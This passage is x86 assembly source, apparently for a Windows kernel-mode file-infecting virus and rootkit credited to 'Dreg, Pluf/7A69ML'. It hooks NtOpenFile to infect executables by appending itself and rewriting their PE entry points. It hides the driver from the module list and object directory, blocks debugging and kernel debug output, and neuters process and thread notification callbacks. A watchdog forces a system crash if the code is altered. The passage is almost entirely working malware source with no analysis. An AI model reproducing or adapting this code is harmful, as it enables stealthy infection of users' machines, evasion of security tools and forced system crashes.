        db  "wcscmp",                   0h
        db  "ntoskrnl.exe",             0h
        ; hal.dll:
        dd  offset halcrc_begin
        db  (hal_api_count shr 1)
        db  "KeAcquireSpinLock",        0h
        db  "KeGetCurrentIrql",         0h
        db  "KeReleaseSpinLock",        0h
        db  "hal.dll",                  0h
        ; services:
        dd  offset ntservicescrc_begin
        db  (ntservices_count shr 1)
        db  "ZwDebugActiveProcess",     0h
        db  "ZwEnumerateBootEntries",   0h
        db  "ZwOpenFile",               0h
        db  "services",                 0h
        ; kernel32.dll:
        dd  offset kerncrc_begin
        db  (kern_api_count shr 1)
        db  "CloseHandle",              0h
        db  "CreateFileA",              0h
        db  "CreateFileMappingA",       0h
        db  "DeleteFileA",              0h
        db  "GetFullPathNameA",         0h
        db  "LoadLibraryA",             0h
        db  "MapViewOfFile",            0h
        db  "UnmapViewOfFile",          0h
        db  "VirtualAlloc",             0h
        db  "VirtualFree",              0h
        db  "WriteFile",                0h
        db  "kernel32.dll",             0h 
        ; advapi.dll:
        dd  offset advapicrc_begin
        db  (adv_api_count shr 1) 
        db  "CloseServiceHandle",       0h
        db  "ControlService",           0h
        db  "CreateServiceA",           0h
        db  "DeleteService",            0h
        db  "OpenSCManagerA",           0h
        db  "OpenServiceA",             0h
        db  "StartServiceA",            0h
        db  "advapi32.dll",             0h
        ; ntdll.dll:
        dd  offset ntdllcrc_begin
        db  (ntdll_api_count shr 1)
        db  "ZwEnumerateBootEntries",   0h
        db  "ntdll.dll",                0h
api_names_end:
        dd  0
_title  db  "[Cerdalux by Dreg, Pluf/7A69ML]",0h
_text   db  "[first step]",0h
 
        ;--------------------------------------
        ; driver begin
        ;--------------------------------------
 
drv_begin:
driver      sys_body        <>
drvcode_begin:
 
        ;--------------------------------------
        ; driver entry
        ;--------------------------------------
 
        ; system thread context: passive_level: stdcall: ntstatus: 2params
driver_entry:
        pushad
        call    getdelta
        mov     ebx, dword ptr [esp + _pushad]
        call    get_base
        call    get_ring0api
        ; crc table apis ntoskrnl.exe:
ntoscrc_begin:
        dd      (ntos_api_count shr 1) + 1 dup (0)
ntosrcr_end:
        ntos_name   dd  (0) ; crc ntos name
        ; crc table apis hal.dll:
halcrc_begin:
        dd      (hal_api_count shr 1) + 1 dup (0)
halcrc_end:
        hal_name    dd  (0) ; crc hal name
get_base:
        and     bx, 0F001h
        dec     ebx
        cmp     word ptr [ebx], 'ZM'
        jnz     get_base
        ret
getdelta:
        call    _delta
delta   dd      0       ; ring0data pointer: [ebp]
_delta: pop     ebp
        ret
get_ring0api:
        pop     esi
        mov     edx, esp
        sub     esp, size ring0data.api
        mov     edi, esp
        push    edx
        push    edi
        call    get_apis
        pop     ebx
        lodsd
        lea     eax, dword ptr [ebp + (offset hal_api_uname - offset delta)]
        push    eax
        mov     ax, offset hal_uname - offset hal_api_uname
        push    ax
        dec     eax
        dec     eax
        push    ax
        push    esp
        call    dword ptr [ebx + ring0data.api.ntos.MmGetSystemRoutineAddress.va]
        add     esp, size unicode_string
        pop     edx
        mov     esp, edx
        test    eax, eax
        jz      drv_entry_unsuccess
        mov     esp, ebx
        push    edx
        xchg    ebx, eax
        push    eax
        call    get_base
        call    get_apis
        pop     ebx
        push    size ring0data
        push    NonPagedPool
        call    dword ptr [ebx + ring0data.api.ntos.ExAllocatePool.va]
        pop     edx
        mov     esp, edx
        test    eax, eax
        jz      drv_entry_unsuccess
        mov     esp, ebx
        push    edx
        @unprotect_mring0
        mov     dword ptr [ebp], eax
        @protect_mring0
        mov     edi, eax
        mov     esi, ebx
        mov     ebx, edi
        push    (size ring0data.api) shr 2
        pop     ecx
        rep     movsd
        pop     esp
        @gparam eax, 0
        mov     dword ptr [ebx + ring0data.driver_object], eax
        mov     eax, dword ptr [eax + driver_object.DriverSection]
        mov     dword ptr [ebx + ring0data.module_list], eax
        mov     eax, dword ptr [ebx + ring0data.api.ntos.KeServiceDescriptorTable.va]
        push    dword ptr [eax + service_descriptor_entry.ServiceTableBase]
        pop     dword ptr [ebx + ring0data.service_table]
        push    dword ptr [eax + service_descriptor_entry.NumberOfServices]
        pop     dword ptr [ebx + ring0data.service_count]
register_unload:
        mov     eax, dword ptr [ebx + ring0data.driver_object]
        lea     ecx, dword ptr [ebp + (offset driver_unload - offset delta)]
        mov     dword ptr [eax + driver_object.DriverUnload], ecx
get_ntservices_begin:
        lea     eax, dword ptr [ebp + (offset ufpath_ntdll - offset delta)]
        call    map_imagefile_ring0
        test    eax, eax
        jnz     drv_entry_unsuccess
        push    edi
        push    esi
        call    get_ntservices_map_ntdll
ntservicescrc_begin:
        dd      (ntservices_count shr 1) + 1 dup (0)
ntservicescrc_end:
        dd      (0)
get_ntservices_map_ntdll:
        lea     edi, dword ptr [ebx + ring0data.ntdll_map_base]
        mov     eax, ebx
        mov     ebx, esi
        pop     esi
        push    eax
        call    get_apis
        pop     ebx
        sub     edi, size ring0data.services
        mov     esi, edi
        push    ntservices_count shr 1
        pop     ecx
        mov     edx, dword ptr [ebx + ring0data.service_table]
get_ntservices_next_service:
        lodsd
        cmp     byte ptr [eax], 0B8h
        jne     bad_entry
        mov     eax, dword ptr [eax + 1]
        cmp     eax, dword ptr [ebx + ring0data.service_count]
        jnbe    bad_entry
        lea     eax, dword ptr [edx + eax * 4]
        push    eax
        mov     eax, dword ptr [eax]
        stosd
        pop     eax
        stosd
        jmp     next_entry
bad_entry:
        scasd
        scasd
next_entry:
        lodsd
        loop    get_ntservices_next_service
get_ntservices_unmap_ntdll:
        pop     esi
        pop     edi
        call    unmap_section_ring0        
get_ntservices_end:
raise_irql:
        lea     esi, dword ptr [ebx + ring0data.kirql]
        lea     edi, dword ptr [ebx + ring0data.kspinlock]
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.KeInitializeSpinLock.va]
        push    esi
        push    edi
        call    dword ptr [ebx + ring0data.api.hal.KeAcquireSpinLock.va]
        call    dword ptr [ebx + ring0data.api.hal.KeGetCurrentIrql.va]
        dec     al
        dec     al
        jz      unprotect
        jmp     start_wdog
        unprotect:
        @unprotect_mring0
hook_ntservices_begin:
        call    hook_ntservices
servicehook_begin:
        ; NtDebugActiveProcess service:
        dd      ring0data.services.NtDebugActiveProcess,    \
                offset nt_debug_active_process_hook - offset delta
        ; NtOpenFile service:
        dd      ring0data.services.NtOpenFile,      \
                offset nt_open_file_hook - offset delta
        ; NtEnumerateBootEntries service:
        dd      ring0data.services.NtEnumerateBootEntries,  \
                offset nt_enumerate_boot_entries_hook - offset delta
servicehook_end:
        dd      -1
hook_ntservices:
        pop     esi
        call    hook_functions
hook_ntservices_end:
hook_exported_apis_begin:
        call    hook_exported_apis
expapihook_begin:
        ; DbgPrint:
        dd      ring0data.api.ntos.DbgPrint,    \
                offset api_ntos_dbg_print_hook - offset delta
        ; DbgPrintEx:
        dd      ring0data.api.ntos.DbgPrintEx,  \
                offset api_ntos_dbg_print_ex_hook - offset delta
        ; DbgPrintReturnControlC:
        dd      ring0data.api.ntos.DbgPrintReturnControlC,  \
                offset api_ntos_dbg_print_return_controlc_hook - offset delta
expapihook_end:
        dd  -1
hook_exported_apis:
        pop     esi
        call    hook_functions
        jmp     hook_eat_begin
hook_exported_api_end:
 
        ; in:
        ;   esi = ptr hook table info
        ; out: nothing
 
hook_functions:
hook_next_function:
        lodsd
        inc     eax
        jz      hook_functions_end
        dec     eax
        lea     edx, dword ptr [ebx + eax]
        lodsd
        lea     eax, dword ptr [ebp + eax + hook_data_offset]
        push    esi
        mov     esi, dword ptr [eax + hook_data.signature]
        add     esi, ebp
        mov     edi, dword ptr [edx + ntserv_entry.va]
        push    5
        pop     ecx
        repe    cmpsb
        pop     esi
        jne     hook_next_function
        mov     ecx, dword ptr [eax + hook_data.return_]
        sub     edi, 5
        sub     eax, (hook_data_offset + 5)
        sub     eax, edi
        mov     byte ptr [edi], 0E9h
        inc     edi
        stosd
        jecxz   hook_next_function
        lea     ecx, dword ptr [ebp + ecx]
        mov     dword ptr [ecx], edi
        jmp     hook_next_function
hook_functions_end:
        ret
hook_eat_begin:
        call    hook_eat
ntoseat_begin:
        ; ntoskrnl:
        dd  ring0data.api.ntos_base
        ; PsSetCreateProcessNotifyRoutine:
        dd  ring0data.api.ntos.PsSetCreateProcessNotifyRoutine, \
            offset api_ntos_ps_set_create_process_notify_routine_hook - offset delta
        ; PsSetCreateThreadNotifyRoutine:
        dd  ring0data.api.ntos.PsSetCreateThreadNotifyRoutine,  \
            offset api_ntos_ps_set_create_thread_notify_routine_hook - offset delta
        ; PsRemoveCreateThreadNotifyRoutine:
        dd  ring0data.api.ntos.PsRemoveCreateThreadNotifyRoutine,   \
            offset api_ntos_ps_remove_create_thread_notify_routine_hook - offset delta
        dd  0
ntoseat_end:
        dd  -1
hook_eat:
        pop     esi
next_descriptor:
        lodsd
        inc     eax
        jz      hook_eat_end
        dec     eax
        mov     ecx, dword ptr [ebx + eax]
next_eat_entry:
        lodsd
        test    eax, eax
        jz      next_descriptor
        mov     edx, dword ptr [ebx + eax + api_entry.eat]
        lodsd
        lea     eax, dword ptr [ebp + eax]
        sub     eax, ecx
        xchg    [edx], eax
        jmp     next_eat_entry
hook_eat_end:
hide_driver_from_module_list:
        mov     eax, dword ptr [ebx + ring0data.module_list]
        mov     edx, dword ptr [eax + list_entry.Flink]
        mov     ecx, dword ptr [eax + list_entry.Blink]
        mov     dword ptr [edx + list_entry.Blink], ecx
        mov     dword ptr [ecx + list_entry.Flink], edx
hide_driver_from_object_directory:
        jmp     hide
walk_object_directory:
        push    37
next_list:
        mov     ecx, dword ptr [esi]
        jecxz   get_next_list
        mov     edi, ecx
next_object_entry:
        mov     eax, dword ptr [ecx + object_directory_entry.Object]
        test    eax, eax
        jz      get_next_entry
        mov     eax, dword ptr [eax - 10h]
        cmp     dword ptr [ebx + ring0data.reserved + 4], eax
        jnz     check_object_directory
        mov     eax, dword ptr [ecx + object_directory_entry.Object]
        cmp     dword ptr [ebx + ring0data.driver_object], eax
        jnz     get_next_entry
        mov     eax, dword ptr [ebx + ring0data.reserved + 4]
        dec     dword ptr [eax + 50h]
        mov     edx, dword ptr [ecx + object_directory_entry.ChainLink]
        cmp     edi, ecx
        jnz     unlink
        mov     dword ptr [esi], edx
        jmp     found
unlink: mov     dword ptr [edi + object_directory_entry.ChainLink], edx
found:  xor     esi, esi
        jmp     end_walk_object_directory
check_object_directory:
        cmp     dword ptr [ebx + ring0data.reserved], eax
        jnz     get_next_entry
        push    esi
        push    ecx
        mov     esi, dword ptr [ecx + object_directory_entry.Object]
        call    walk_object_directory
        pop     ecx
        pop     esi
        test    esi, esi
        jz      end_walk_object_directory
get_next_entry:
        mov     edi, ecx
        mov     ecx, dword ptr [ecx + object_directory_entry.ChainLink]
        test    ecx, ecx
        jnz     next_object_entry
get_next_list:
        lodsd
        dec     dword ptr [esp]
        jnz     next_list
end_walk_object_directory:
        pop     eax
        ret
hide:   mov     esi, esp
        xor     eax, eax
        cdq
        mov     al, 05Ch
        push    eax
        bswap   eax
        push    esp
        inc     al
        shl     al, 2
        push    ax
        shr     al, 1
        push    ax
        mov     eax, esp
        sub     esp, size object_attributes
        @init_object_attributes esp, edx, eax, OBJ_CASE_INSENSITIVE, edx
        mov     ecx, esp
        push    esi
        push    edx
        mov     eax, esp
        push    ecx
        push    edx
        push    eax
        call    dword ptr [ebx + ring0data.api.ntos.ZwOpenDirectoryObject.va]
        pop     edi
        pop     esp
        and     eax, eax
        jnz     clean_objects
        lea     ecx, dword ptr [ebp + (offset walk_object_directory - offset delta)]
        push    ecx
        push    eax
        mov     ecx, esp
        push    eax
        push    ecx
        push    eax
        push    eax
        push    eax
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ObReferenceObjectByHandle.va]
        pop     esi
        push    esi
        call    dword ptr [ebx + ring0data.api.ntos.ObDereferenceObject.va]
        mov     eax, esi
        mov     eax, dword ptr [eax - 10h]
        mov     dword ptr [ebx + ring0data.reserved], eax
        mov     eax, dword ptr [ebx + ring0data.api.ntos.IoDriverObjectType.va]
        mov     eax, dword ptr [eax]
        mov     dword ptr [ebx + ring0data.reserved + 4], eax
        pop     eax
        push    edi
        call    eax
        call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
clean_objects:
        xor     eax, eax
        mov     edx, dword ptr [ebx + ring0data.driver_object]
        movzx   ecx, word ptr [edx + driver_object.DriverName._Length]
        mov     edi, dword ptr [edx + driver_object.DriverName.Buffer]
        rep     stosb
        mov     edx, dword ptr [edx + driver_object.DriverExtension]
        movzx   ecx, word ptr [edx + driver_extension.ServiceKeyName._Length]
        mov     edi, dword ptr [edx + driver_extension.ServiceKeyName.Buffer]
        rep     stosb
        mov     edx, dword ptr [ebx + ring0data.module_list]
        movzx   ecx, word ptr [edx + module_entry.path._Length]
        mov     edi, dword ptr [edx + module_entry.path.Buffer]
        rep     stosb
        movzx   ecx, word ptr [edx + module_entry._name._Length]
        mov     edi, dword ptr [edx + module_entry._name.Buffer]
        rep     stosb
lower_irql:
        @protect_mring0
        push    dword ptr [ebx + ring0data.kirql]
        lea     eax, dword ptr [ebx + ring0data.kspinlock]
        push    eax
        call    dword ptr [ebx + ring0data.api.hal.KeReleaseSpinLock.va]
start_wdog:
        mov     esi, offset ring0_wdog_end - offset ring0_wdog_begin
        lea     eax, dword ptr [esi + size wdog_context]
        push    eax
        push    NonPagedPool
        call    dword ptr [ebx + ring0data.api.ntos.ExAllocatePool.va]
        mov     ecx, eax
        jecxz   drv_entry_success
        mov     ecx, esi
        lea     esi, dword ptr [ebp (offset ring0_wdog_begin - offset delta)]
        mov     edi, eax
        rep     movsb
        mov     esi, eax
        lea     eax, dword ptr [esi + (offset api_ntos_ke_bugcheck - offset ring0_wdog_begin)]
        push    dword ptr [ebx + ring0data.api.ntos.KeBugCheck.va]
        pop     dword ptr [eax]
        lea     eax, dword ptr [esi + (offset api_ntos_ke_initialize_dpc - offset ring0_wdog_begin)]
        push    dword ptr [ebx + ring0data.api.ntos.KeInitializeDpc.va]
        pop     dword ptr [eax]
        lea     eax, dword ptr [esi + (offset api_ntos_ke_initialize_timer - offset ring0_wdog_begin)]
        push    dword ptr [ebx + ring0data.api.ntos.KeInitializeTimer.va]
        pop     dword ptr [eax]
        lea     eax, dword ptr [esi + (offset api_ntos_ke_set_timer - offset ring0_wdog_begin)]
        push    dword ptr [ebx + ring0data.api.ntos.KeSetTimer.va]
        pop     dword ptr [eax]
        lea     eax, dword ptr [esi + (offset ring0_wdog_end - offset ring0_wdog_begin)]
        lea     ebx, dword ptr [esi + (offset wdog_ctx_addr - offset ring0_wdog_begin)]
        mov     dword ptr [ebx], eax
        lea     eax, dword ptr [esi + (offset wdog_begin_addr - offset ring0_wdog_begin)]
        mov     dword ptr [eax], esi
        lea     eax, dword ptr [ebp + (offset drv_begin - offset delta)]
        lea     ebx, dword ptr [esi + (offset buf_drv_begin - offset ring0_wdog_begin)]
        mov     dword ptr [ebx], eax
        lea     edi, dword ptr [ebp + (offset drv_end - offset delta)]
        lea     ebx, dword ptr [esi + (offset buf_drv_end - offset ring0_wdog_begin)]
        mov     dword ptr [ebx], edi
        call    gen_crc32_datbuf
        lea     ebx, dword ptr [esi + (offset orig_drv_crc - offset ring0_wdog_begin)]
        mov     dword ptr [ebx], eax
        xor     eax, eax
        push    eax
        push    eax
        push    eax
        push    eax
        call    esi
drv_entry_success:
        push    STATUS_SUCCESS
        pop     eax
        jmp     drv_entry_ret
drv_entry_unsuccess:
        push    STATUS_UNSUCCESSFUL
        pop     eax
drv_entry_ret:
        @cb_end driverentry_param_count
 
        ;--------------------------------------
        ; driver unload
        ;--------------------------------------
 
        ; driver unload:
        ; system thread context: passive level: stdcall: void: 1param
driver_unload:
        @cb_begin
        @cb_end driverunload_param_count
 
        ;--------------------------------------
        ; service hook routines
        ;--------------------------------------
 
        ; NtOpenFile hook:
        ; user thread context: passive level: stdcall: ntstatus: 14params
nt_open_file_hook:
        @cb_begin
        jmp     $+10
        dd      offset  nt_open_file_orig - offset delta
        dd      offset  nt_open_file_hook_back - offset delta
        lea     esi, dword ptr [esp + _pushad + 4]
        push    ntopenfile_param_count
        pop     eax
        mov     ecx, eax
        shl     eax, 2
        sub     esp, eax
        mov     edi, esp
        rep     movsd
        lea     eax, dword ptr [ebp + (offset check_infect - offset delta)]
        push    eax
        nt_open_file_orig:
        mov     edi, edi
        push    ebp
        mov     ebp, esp
        push    01234567h
        nt_open_file_hook_back    equ $-4
        ret
check_infect:
        mov     ebx, dword ptr [ebp]
        mov     edx, eax
        and     eax, eax
        jne     ntopenfile_ret
        @gparam ecx, 0
        cmp     eax, dword ptr [ecx]
        jz      ntopenfile_ret
        @gparam eax, 5
        and     eax, FILE_DIRECTORY_FILE
        jne     ntopenfile_ret
        @gparam edi, 2
        mov     edi, dword ptr [edi + object_attributes.ObjectName]
        mov     ecx, dword ptr [edi + unicode_string._Length]
        jcxz    ntopenfile_ret
        bswap   ecx
        jcxz    ntopenfile_ret
        cmp     eax, dword ptr [edi + unicode_string.Buffer]
        je      ntopenfile_ret
        push    edi
        movzx   esi, word ptr [edi + unicode_string._Length]
        add     esi, dword ptr [edi + unicode_string.Buffer]
        lea     edi, dword ptr [ebp + ((offset exe_ext + sizeof exe_ext - 1) - offset delta)]
        push    4
        pop     ecx
        std
        lodsw
is_exe: lodsw
        or      al, 20h
        scasb
        loope   is_exe
        cld
        pop     edi
        jne     ntopenfile_ret
        mov     esi, dword ptr [edi + unicode_string.Buffer]
        lea     esi, dword ptr [esi + 6*2]
        cmp     byte ptr [esi], '\'
        jnz     ntopenfile_ret
        lodsw
        push    edx
        mov     edx, ecx
        inc     edx
        inc     edx
        shl     edx, 4
        lea     edi, dword ptr [ebp + (offset systemroot - offset delta)]
        push    7
        pop     ecx
is_wnd: mov     al, byte ptr [edi]
        inc     edi
        xchg    al, dh
        lodsb
        or      al, dl
        sub     al, dh
        lodsb
        loope   is_wnd
        pop     edx
        je      ntopenfile_ret
        @gparam eax, 0
        mov     eax, dword ptr [eax]
        push    edx
        call    infect_file
        pop     edx                
ntopenfile_ret:
        mov     eax, edx
        @cb_end ntopenfile_param_count
 
        ; NtEnumerateBootEntries hook:
        ; user thread context: passive level: ntstatus: stdcall: 2params
nt_enumerate_boot_entries_hook:
        @cb_begin
        jmp     $+10
        dd      offset nt_enumerate_boot_entries_orig - offset delta
        dd      0
        nt_enumerate_boot_entries_orig:
        mov     eax, STATUS_NOT_IMPLEMENTED
        @gparam ecx, 0
        @gparam edx, 1
        xor     esi, esi
        push    esi
        add     esi, 05F5Fh
        shl     esi, 1
        sub     cx, si
        pop     esi
        jnz     @l1
        add     esi, 0657Fh
        shl     esi, 1
        sub     dx, si
        jnz     @l1
        xor     eax, eax
@l1:    @cb_end ntenumeratebootentries_param_count
 
        ; NtDebugActiveProcess hook:
        ; user thread context: passive level: ntstatus: stdcall: 2params
nt_debug_active_process_hook:
        @cb_begin
        jmp     $+15
        dd      offset  nt_debug_active_process_orig - offset delta
        dd      0
        nt_debug_active_process_orig:
        mov     edi, edi
        push    ebp
        mov     ebp, esp
        push    STATUS_INVALID_HANDLE
        pop     eax
        @cb_end ntdebugactiveprocess_param_count
 
        ;--------------------------------------
        ; exported api hook routines
        ;--------------------------------------
 
        ; DbgPrint/DbgPrintEx/DbgPrintReturnControlC hook:
        ; arbitrary thread context: any IRQL: cdecl: ulong(ntstatus): 1-Nparams
api_ntos_dbg_print_hook:
api_ntos_dbg_print_ex_hook:
api_ntos_dbg_print_return_controlc_hook:
        @cb_begin
        jmp     $+15
        dd      offset  nt_api_ntos_dbg_printx_orig - offset delta
        dd      0
        nt_api_ntos_dbg_printx_orig:
        mov     edi, edi
        push    ebp
        mov     ebp, esp
        push    STATUS_SUCCESS
        pop     eax
        @cb_end 0
 
        ;--------------------------------------
        ; EAT hook routines
        ;--------------------------------------
 
        ; PsSetCreateProcessNofityRoutine hook:
        ; arbitrary thread context: passive level: stdcall: ntstatus: 2params
api_ntos_ps_set_create_process_notify_routine_hook:     ; register/unregister callback
        @cb_begin
        push    STATUS_SUCCESS
        pop     eax
        @cb_end pssetcreateprocessnotifyroutine_param_count
 
        ; PsSet/RemoveCreateThreadNotifyRoutine hook:
        ; arbitrary thread context: passive level: stdcall: ntstatus: 1param
api_ntos_ps_set_create_thread_notify_routine_hook:      ; register callback
api_ntos_ps_remove_create_thread_notify_routine_hook:   ; unregister callback
        @cb_begin
        push    STATUS_SUCCESS
        pop     eax
        @cb_end pssetremovecreatethreadnotifyroutine_params_count
 
        ;--------------------------------------
        ; wdog routine (CustomTimerDpc)
        ;--------------------------------------
 
        ; system thread context: dispatch level: stdcall: void: 4params
ring0_wdog_begin:
        pushad
        mov     eax, 12345678h
buf_drv_begin   equ $-4
        mov     edi, 23456781h
buf_drv_end     equ $-4
        call    gen_crc32_datbuf
        cmp     eax, 34567812h
orig_drv_crc    equ $-4
        jz      install_dpc
reboot: push    POWER_FAILURE_SIMULATE
        mov     eax, 45678123h
api_ntos_ke_bugcheck equ $-4
        call    eax
install_dpc:
        mov     esi, 56781234h
wdog_ctx_addr   equ $-4
        mov     ecx, 67812345h
wdog_begin_addr equ $-4
        push    esi
        push    ecx
        push    esi
        mov     eax, 78123456h
api_ntos_ke_initialize_dpc equ   $-4
        call    eax
        lea     edi, dword ptr [esi + wdog_context.Timer]
        push    edi
        mov     eax, 8123467h
api_ntos_ke_initialize_timer    equ $-4
        call    eax
        xor     eax, eax
        cdq
        dec     eax
        mov     edx, -100000000
        push    esi
        push    eax
        push    edx
        push    edi
        mov     eax, 12345678h
api_ntos_ke_set_timer   equ $-4
        call    eax
        @cb_end custom_dpc_param_count
 
        ; in:
        ;   eax = ptr api name string, ptr begin data buf
        ;   edi = ptr end data buf
        ; out:
        ;   eax = api crc
        ; (orig by roy g biv)
 
gen_crc32_datbuf:
        push    edi
        cmp     edi, eax
        jz      gen_crc32_end
        jmp     gen_crc32
gen_crc32_szname:
        push    edi
        xor     edi, edi
gen_crc32:
        push    ecx
        push    ebx
create_loop:
        or      ebx, -1
create_outer:
        xor     bl, byte ptr [eax]
        push    8
        pop     ecx
create_inner:
        add     ebx, ebx
        jnb     create_skip
        xor     ebx, 4c11db7h
create_skip:
        loop    create_inner
        test    edi, edi
        jz      l1
        inc     eax
        cmp     edi, eax
        jnz     create_outer
        jmp     l2
l1:     sub     cl, byte ptr [eax]
        inc     eax
        jb      create_outer
l2:     xchg    eax, ebx
        pop     ebx
        pop     ecx
        pop     edi
gen_crc32_end:
        ret
ring0_wdog_end:
 
        ; PE infecction routine:
		;
        ; in:
        ;   ebx = ptr ring0data
        ;   ebp = delta offset
        ;   eax = handle of file to infect
        ; out: nothing
 
infect_file:
        mov     edi, eax
        mov     ecx, esp
        sub     esp, size io_status_block + size file_standard_information
        mov     esi, esp
        push    ecx
        push    FileStandardInformation
        push    size file_standard_information
        push    esi
        lea     ecx, dword ptr [esi + size file_standard_information]
        push    ecx
        push    eax
        call    dword ptr [ebx + ring0data.api.ntos.ZwQueryInformationFile.va]
        mov     esi, dword ptr [esi + file_standard_information.EndOfFile]
        pop     esp
        test    eax,eax
        jne     infect_file_ret
        call    map_file_ring0
        and     eax, eax
        jnz     infect_file_ret
        push    esi
        push    edi
        mov     edi, ecx
        cmp     word ptr [esi + mzhdr.mz_magic], "ZM"
        jne     infect_file_unmap
        mov     eax, dword ptr [esi + mzhdr.mz_lfanew]
        add     eax, esi
        cmp     word ptr [eax + pehdr.pe_signature], "EP"
        jne     infect_file_unmap
        mov     ecx, dword ptr [eax + pehdr.pe_coff_machine]
        cmp     cx, IMAGE_FILE_MACHINE_I386
        jne     infect_file_unmap
        shr     ecx, 16
        jz      infect_file_unmap
        dec     ecx
        imul    ecx, ecx, 28h
        lea     ecx, dword ptr [eax + ecx + size pehdr]
        mov     esi, eax
        movzx   eax, word ptr [eax + pehdr.pe_coff_flags]
        test    ah, IMAGE_FILE_DLL shr 8
        jnz     infect_file_unmap
        test    ah, IMAGE_FILE_SYSTEM shr 8
        jnz     infect_file_unmap
        mov     eax, dword ptr [ecx + pe_sect.sect_rawaddr]
        add     eax, dword ptr [ecx + pe_sect.sect_rawsize]
        cmp     eax, edx
        jne     infect_file_unmap
        push    eax
        sub     eax, dword ptr [ecx + pe_sect.sect_rawaddr]
        add     eax, offset drv_end - offset drv_begin
        mov     esi, dword ptr [esi + pehdr.pe_ophdr_filealign]
        dec     esi
        add     eax, esi
        not     esi
        and     eax, esi
        mov     esi, eax
        sub     eax, dword ptr [ecx + pe_sect.sect_rawsize]
        add     edx, eax
        pop     eax
        mov     dword ptr [esp - 04h], esi
        mov     dword ptr [esp - 08h], edi
        mov     dword ptr [esp - 0Ch], edx
        pop     edi
        pop     esi
        push    eax
        sub     ecx, esi
        push    ecx
        sub     esp, 0Ch
        call    unmap_section_ring0
        pop     esi
        pop     edi
        rdtsc 
        and     eax, DYNAMIC_PADD - 1
        add     esi, eax
        add     esi, STATIC_PADD
        call    map_file_ring0
        pop     ebx
        pop     ecx
        pop     edx
        test    eax,eax
        jne     infect_file_ret
        push    esi
        xchg    edi, edx
        push    edx
        mov     edx, dword ptr [esi + mzhdr.mz_lfanew]
        add     edx, esi
        add     ecx, esi
        mov     eax, dword ptr [ecx + pe_sect.sect_rawsize]
        add     eax, dword ptr [ecx + pe_sect.sect_virtaddr]
        add     eax, offset ring3_start - offset drv_begin
        xchg    dword ptr [edx + pehdr.pe_ophdr_entrypointrva], eax
        push    eax
        mov     dword ptr [ecx + pe_sect.sect_rawsize], ebx
        cmp     dword ptr [ecx + pe_sect.sect_virtsize], ebx
        jae     copy_virus
        mov     dword ptr [ecx + pe_sect.sect_virtsize], ebx
        add     ebx, dword ptr [ecx + pe_sect.sect_virtaddr]
        mov     dword ptr [edx + pehdr.pe_ophdr_imagesize], ebx
        mov     eax, dword ptr [edx + pehdr.pe_ophdr_sectalign]
        dec     eax
        add     dword ptr [edx + pehdr.pe_ophdr_imagesize], eax
        not     eax
        and     dword ptr [edx + pehdr.pe_ophdr_imagesize], eax
copy_virus:
        or      dword ptr [ecx + pe_sect.sect_flags], IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_CNT_CODE
        add     edi, esi
        mov     eax, edi
        lea     esi, dword ptr [ebp + (offset drv_begin - offset delta)]
        push    offset drv_end - offset drv_begin
        pop     ecx
        rep     movsb
        pop     ecx
        add     ecx, dword ptr [edx + pehdr.pe_ophdr_imagebase]
        lea     eax, dword ptr [eax + (offset host_start_ep - offset drv_begin)]
        mov     dword ptr [eax], ecx
infect_file_unmap:
        mov     ebx, dword ptr [ebp]
        pop     edi
        pop     esi
        jmp     unmap_section_ring0
infect_file_ret:
        mov     ebx, dword ptr [ebp]
        ret
 
        ; in:
        ;   edi = handle file to map
        ;   esi = section size, with padd
        ; out:
        ;   esi = mapping addr
        ;   edi = section handle
        ;   ecx = file handle
        ;   edx = secction size
        ; ret:
        ;   ok:     eax = 0
        ;   error:  eax != 0
 
map_file_ring0:
        xor     ecx, ecx
        mov     eax, esp
        push    ecx
        push    esi
        push    eax
        push    ecx
        push    edi
        push    SEC_COMMIT
        push    PAGE_READWRITE
        lea     eax, dword ptr [esp + 5*4]
        push    eax
        push    ecx
        push    SECTION_QUERY or SECTION_MAP_WRITE or SECTION_MAP_READ or STANDARD_RIGHTS_REQUIRED
        lea     eax, dword ptr [esp + 6*4]
        push    eax
        call    dword ptr [ebx + ring0data.api.ntos.ZwCreateSection.va]
        pop     edx
        pop     esp
        test    eax,eax
        jne     map_file_ring0_ret
        xchg    edx, edi
        push    edx
        push    eax
        push    eax
        push    PAGE_READWRITE
        push    eax
        push    ViewShare
        lea     ecx, dword ptr [esp + 4*4]
        push    ecx
        push    eax
        push    eax
        push    eax
        lea     ecx, dword ptr [esp + 7*4]
        push    ecx
        push    NtCurrentProcess
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ZwMapViewOfSection.va]
        pop     edx
        pop     ecx
        pop     ecx
        xchg    esi, edx
        test    eax, eax
        jz      map_file_ring0_ret
        push    edi
        call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
        inc     eax
map_file_ring0_ret:
        ret
 
        ; in:
        ;   eax = ptr full path name (wchar)
        ; out:
        ;   esi = mapping addr
        ;   edi = section handle
        ; ret:
        ;   ok:     eax = 0
        ;   error:  eax != 0
 
map_imagefile_ring0:
        mov     edx, esp
        push    eax
        mov     ax, offset hal_api_uname - offset ufpath_ntdll
        push    ax
        dec     ax
        dec     ax
        push    ax
        mov     eax, esp
        sub     esp, size object_attributes + size io_status_block
        xor     ecx, ecx
        @init_object_attributes esp, ecx, eax, OBJ_CASE_INSENSITIVE, ecx
        push    edx
        push    ecx
        mov     eax, esp
        push    FILE_SYNCHRONOUS_IO_NONALERT
        push    FILE_SHARE_READ
        lea     edx, dword ptr [eax + 8 + size object_attributes]
        push    edx
        lea     edx, dword ptr [eax + 8]
        push    edx
        push    FILE_EXECUTE
        push    eax
        call    dword ptr [ebx + ring0data.api.ntos.ZwOpenFile.va]
        pop     esi
        pop     esp
        test    eax, eax
        jnz     map_imagefile_ring0_ret
        push    eax
        mov     ecx, esp
        push    esi
        push    SEC_IMAGE
        push    PAGE_EXECUTE
        push    eax
        push    eax
        push    SECTION_ALL_ACCESS
        push    ecx
        call    dword ptr [ebx + ring0data.api.ntos.ZwCreateSection.va]
        pop     edi
        push    eax
        push    esi
        call    dword ptr [ebx + ring0data.api.ntos.ZwClose.va]
        pop     eax
        test    eax, eax
        jnz     map_imagefile_ring0_ret
        push    eax
        push    eax
        mov     ecx, esp
        push    PAGE_READWRITE
        push    MEM_TOP_DOWN
        push    ViewShare
        lea     edx, dword ptr [ecx + 4]
        push    edx
        push    eax
